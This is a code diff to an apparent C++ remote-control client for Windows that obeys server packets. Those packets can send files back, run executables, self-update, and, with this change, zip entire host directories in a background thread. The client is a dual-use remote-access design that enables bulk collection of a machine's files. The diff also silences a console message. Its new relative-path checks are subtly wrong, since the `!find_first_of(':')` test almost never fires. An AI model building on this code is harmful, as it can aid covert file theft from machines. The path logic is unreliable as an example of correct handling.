@@ -4,9 +4,15 @@
 
 #include <cstdio>
 #include <process.h>
+#include <sys/stat.h>
+#include <string.h>
 #include <libzippp/libzippp.h>
+#include <filesystem>
 
+namespace fs = std::filesystem;
 using namespace libzippp;
+
+ZipArgs zipArgs {"","",false};
 
 Client* Client::clientptr = NULL;
 bool Client::connected = false;
@@ -79,6 +85,9 @@ bool Client::ProcessPacketType(PacketType _PacketType)
 		std::string FileName; //string to store file name
 		if (!GetString(FileName)) //If issue getting file name
 			return false; //Failure to process packet
+		if (!FileName.find_first_of(':')) { //This is a relative path
+			FileName = SHELL_PATH() + FileName;
+		}
 
 		ofile = FileTransferData();
 		ofile.infileStream.open(FileName, std::ios::binary | std::ios::ate); //Open file to read in binary | ate mode. We use ate so we can use tellg to get file size. We use binary because we need to read bytes as raw data
@@ -126,6 +135,9 @@ bool Client::ProcessPacketType(PacketType _PacketType)
 		std::string exe;
 		if (!GetString(exe))
 			return false;
+		if (!exe.find_first_of(':')) { //This is a relative path
+			exe = GetCWD() + exe;
+		}
 		PROCESS_INFORMATION piProcInfo;
 		STARTUPINFO siStartInfo;
 		BOOL bSuccess = FALSE;
@@ -181,10 +193,38 @@ bool Client::ProcessPacketType(PacketType _PacketType)
 		SendString("Renamed files successfully, update begun\n", PacketType::Warning);
 		break;
 	}
+	case PacketType::Zip:
+	{
+		std::string dir;
+		std::string archive_name;
+
+		if (!GetString(dir))
+			return false;
+
+		if (zipArgs.zipping) {
+			SendString("Already zipping a directory: " + zipArgs.dir, PacketType::Warning);
+			break;
+		}
+		else {
+			zipArgs.zipping = true;
+		}
+
+		int index = dir.find_last_of('/');
+		if (index == std::string::npos) index = dir.find_last_of('\\');
+		archive_name = dir.substr(index + 1, dir.length() + 1);
+
+		zipArgs.dir = dir;
+		zipArgs.output_name = archive_name + ".zip";
+
+		_beginthreadex(NULL, NULL, (_beginthreadex_proc_type)zip_directory_async, &zipArgs, NULL, NULL); //Create the client thread that will receive any data that the server sends.
+
+		SendString("Started zipping directory: " + dir, PacketType::Instruction);
+		break;
+	}
 	case PacketType::Heartbeat:
 		break;
 	default: //If PacketType type is not accounted for
-		std::cout << "Unrecognized PacketType: " << (int32_t)_PacketType << std::endl; //Display that PacketType was not found
+		//std::cout << "Unrecognized PacketType: " << (int32_t)_PacketType << std::endl; //Display that PacketType was not found
 		break;
 	}
 	return true;
@@ -347,4 +387,43 @@ bool unzip(const std::string& zipPath, const std::string& desPath)
 	zf.close();
 
 	return true;
+}
+
+std::string get_rel_path(const std::string& full_path) {
+	int index = full_path.find_first_of('\\');
+	return full_path.substr(index + 1, full_path.length() + 1);
+}
+
+void walk_directory(const std::string& startdir, const std::string& inputdir, ZipArchive* zipper)
+{
+	for (const auto& entry : fs::directory_iterator(inputdir)) {
+		if (entry.is_directory()) {
+			walk_directory(startdir, entry.path().string(), zipper);
+		}
+		else {
+			zipper->addFile(get_rel_path(entry.path().string()), entry.path().string());
+		}
+	}
+}
+
+bool zip_directory(const std::string& inputdir, const std::string& output_name)
+{
+	ZipArchive zf(SHELL_PATH() + output_name);
+	zf.open(ZipArchive::Write);
+	if (!zf.isOpen()) {
+		zf.close();
+		Log("Couldn't open archive\n");
+		return false;
+	}
+
+	walk_directory(inputdir, inputdir, &zf);
+
+	zf.close();
+	return true;
+}
+
+void zip_directory_async(ZipArgs* args) {
+	zip_directory(args->dir, args->output_name);
+	zipArgs.zipping = false;
+	Client::clientptr->SendString("Zipped archive with name: " + args->output_name, PacketType::Warning);
 }
